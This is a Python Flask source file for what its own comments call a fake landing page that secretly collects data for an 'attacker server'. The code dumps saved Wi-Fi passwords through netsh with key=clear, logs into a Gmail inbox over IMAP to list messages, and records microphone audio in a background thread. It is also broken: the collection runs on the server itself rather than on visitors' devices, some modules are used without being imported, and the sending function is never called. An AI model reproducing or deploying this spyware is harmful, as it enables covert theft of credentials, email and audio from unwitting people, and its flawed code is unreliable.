from flask import Flask, render_template, request, jsonify
import platform
import socket
import subprocess
import cv2
import base64
import threading
import time
import random
import string
import json
import os
import pyaudio
import wave

app = Flask(__name__)

# Generate unique session ID
def generate_session_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Store collected data
collected_data = {}

# Fake landing page
@app.route('/')
def index():
    session_id = generate_session_id()
    collected_data[session_id] = {}
    return render_template('index.html', session_id=session_id)

# Real collection endpoint
@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    session_id = data.get('session_id')
    
    if not session_id or session_id not in collected_data:
        return jsonify({'error': 'Invalid session'}), 400
    
    # Collect device info
    collected_data[session_id]['device'] = {
        'platform': platform.system(),
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'timestamp': time.time()
    }
    
    # Collect location (simulated)
    collected_data[session_id]['location'] = {
        'lat': 40.7128,
        'lng': -74.0060
    }
    
    # Get passwords (Windows/Linux example)
    passwords = []
    if platform.system() == 'Windows':
        try:
            output = subprocess.check_output('netsh wlan show profiles').decode('utf-8')
            for line in output.split('\n'):
                if 'All User Profile' in line:
                    ssid = line.split(': ')[1].strip()
                    pwd = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear').decode('utf-8')
                    passwords.append({'ssid': ssid, 'password': pwd.split('Key Content')[1].split(':')[1].strip()})
        except:
            pass
    collected_data[session_id]['passwords'] = passwords
    
    # Get emails (example)
    emails = []
    try:
        # Gmail example
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login('fake@example.com', 'fakepassword')
        mail.select('inbox')
        _, data = mail.search(None, 'ALL')
        for num in data[0].split():
            _, msg_data = mail.fetch(num, '(RFC822)')
            msg = email.message_from_bytes(msg_data[0][1])
            emails.append({
                'subject': msg['Subject'],
                'from': msg['From'],
                'date': msg['Date']
            })
        mail.close()
        mail.logout()
    except:
        pass
    collected_data[session_id]['emails'] = emails
    
    # Audio capture
    try:
        audio_thread = threading.Thread(target=capture_audio, args=(session_id,))
        audio_thread.daemon = True
        audio_thread.start()
    except:
        pass
    
    return jsonify({'status': 'success'})

# Audio capture function
def capture_audio(session_id):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 10
    
    p = pyaudio.PyAudio()
    
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    frames = []
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    p.terminate()
    
    # Save audio
    wf = wave.open(f'/tmp/audio_{session_id}.wav', 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

# Send collected data to attacker server
def send_data(session_id):
    data = collected_data.get(session_id, {})
    if not data:
        return
        
    # Simulate sending to attacker server
    print(f"Sending data for session {session_id}: {data}")
    del collected_data[session_id]

# Periodic cleanup
def cleanup():
    while True:
        time.sleep(3600)  # Check every hour
        for sid in list(collected_data.keys()):
            if time.time() - collected_data[sid].get('timestamp', 0) > 86400:  # 24 hours
                del collected_data[sid]

# Start cleanup thread
threading.Thread(target=cleanup, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
